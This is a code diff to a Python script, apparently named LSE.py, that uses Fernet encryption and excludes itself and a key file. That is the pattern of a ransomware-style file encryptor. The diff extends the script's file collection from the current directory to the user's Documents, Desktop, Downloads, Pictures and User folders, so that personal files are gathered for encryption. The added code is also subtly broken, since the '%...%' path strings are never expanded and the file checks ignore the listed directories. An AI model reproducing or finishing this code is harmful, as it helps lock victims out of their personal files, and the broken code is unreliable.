@@ -3,7 +3,41 @@ from cryptography.fernet import Fernet
 
 files = []
 
-for file in os.listdir():
+e4 = '%Documents%'
+
+h4 = '%User%'
+
+v3 = '%Downloads%'
+
+dry4 = '%Desktop%'
+
+dry77 = '%Pictures%'
+
+for file in os.listdir(e4):
+        if file == "LSE.py" or file == "thekey.key":
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+
+for file in os.listdir(h4):
+        if file == "LSE.py" or file == "thekey.key":
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+
+for file in os.listdir(v3):
+        if file == "LSE.py" or file == "thekey.key":
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+
+for file in os.listdir(dry4):
+        if file == "LSE.py" or file == "thekey.key":
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+
+for file in os.listdir(dry77):
         if file == "LSE.py" or file == "thekey.key":
                 continue
         if os.path.isfile(file):
